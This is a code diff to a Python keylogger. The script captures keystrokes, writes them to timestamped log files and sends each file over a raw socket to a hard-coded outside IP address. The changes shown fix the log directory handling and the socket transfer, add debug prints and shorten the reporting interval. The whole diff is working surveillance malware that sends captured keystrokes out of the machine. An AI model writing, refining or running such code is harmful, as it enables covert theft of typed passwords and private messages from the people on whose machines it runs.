@@ -2,6 +2,7 @@ import keyboard
 import socket
 from datetime import datetime
 from threading import Timer
+import os
 
 class Keylogger:
     def __init__(self, interval):
@@ -28,7 +29,10 @@ class Keylogger:
     def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"logs/keylog-{start_dt_str}_{end_dt_str}.txt"
+        #self.filename = f"logs/keylog-{start_dt_str}_{end_dt_str}.txt"
+        if not os.path.exists("logs"):
+            os.mkdir("logs")
+        self.filename = os.path.join(os.getcwd(), "logs", f"keylog-{start_dt_str}_{end_dt_str}.txt")
     
     def save_file(self):
         with open(self.filename, "w+") as f:
@@ -38,6 +42,7 @@ class Keylogger:
     def send_file(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('140.113.168.197', 12345))
+        print('socket connected')
 
         with open(self.filename, 'rb') as f:
             s.send(b'BEGIN')
@@ -46,9 +51,10 @@ class Keylogger:
                 if not data:
                     break
                 s.send(data)
-
-            s.send(b'END')
             f.close()
+        s.send(b'END')
+        print('file sent')
+
         s.close()
     
     def report(self):
@@ -70,5 +76,5 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == "__main__":
-    klg = Keylogger(interval=15)
+    klg = Keylogger(interval=10)
     klg.start()        
